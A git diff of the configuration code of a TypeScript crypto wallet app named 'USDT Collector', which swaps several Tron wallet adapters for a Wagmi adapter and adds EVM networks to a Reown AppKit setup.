@@ -8,18 +8,22 @@ import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
 import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'
 
-// import { TokenPocketAdapter } from '@tronweb3/tronwallet-adapter-tokenpocket'
-// import { BitKeepAdapter } from '@tronweb3/tronwallet-adapter-bitkeep'
-// import { LedgerAdapter } from '@tronweb3/tronwallet-adapter-ledger'
-import { BinanceWalletAdapter } from '@tronweb3/tronwallet-adapter-binance'
-import { BybitWalletAdapter } from '@tronweb3/tronwallet-adapter-bybit'
-import { TokenPocketAdapter } from '@tronweb3/tronwallet-adapter-tokenpocket'
-import { BitKeepAdapter } from '@tronweb3/tronwallet-adapter-bitkeep'
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
+import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
+import type { AppKitNetwork } from '@reown/appkit/networks'
 
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
 const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
+
+const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
+  tronMainnet,
+  mainnet,
+  arbitrum,
+  bsc,
+  polygon,
+]
 
 const NETWORK_CONFIG = {
   Mainnet: {
@@ -32,7 +36,6 @@ const NETWORK_CONFIG = {
   },
 }
 
-
 const { usdtAddress: USDT_ADDRESS } =
   NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
@@ -43,17 +46,18 @@ const tronAdapter = new TronAdapter({
     new MetaMaskAdapter(),
     new TrustAdapter({ openUrlWhenWalletNotFound: false }),
     new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
-    new BinanceWalletAdapter({ openUrlWhenWalletNotFound: false }),
-    new BybitWalletAdapter({ openUrlWhenWalletNotFound: false }),
-    new TokenPocketAdapter({ openUrlWhenWalletNotFound: false }),
-    new BitKeepAdapter({ openUrlWhenWalletNotFound: false }),
-  ]
+  ],
+})
+
+const wagmiAdapter = new WagmiAdapter({
+  projectId: WC_PROJECT_ID,
+  networks: appkitNetworks,
 })
 
 // ── Create AppKit ──
 createAppKit({
-  adapters: [tronAdapter],
-  networks: [NETWORK === 'Mainnet' ? tronMainnet : tronShastaTestnet],
+  adapters: [tronAdapter, wagmiAdapter],
+  networks: appkitNetworks,
   projectId: WC_PROJECT_ID,
   metadata: {
     name: 'USDT Collector',
@@ -66,13 +70,6 @@ createAppKit({
     '--w3m-accent': '#00ff9f',
   },
   allWallets: 'SHOW',
-
- featuredWalletIds: [
-  '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
-  'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
-  '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662', // Bitget Wallet
-],
-
   features: {
     email: false,
     socials: [],
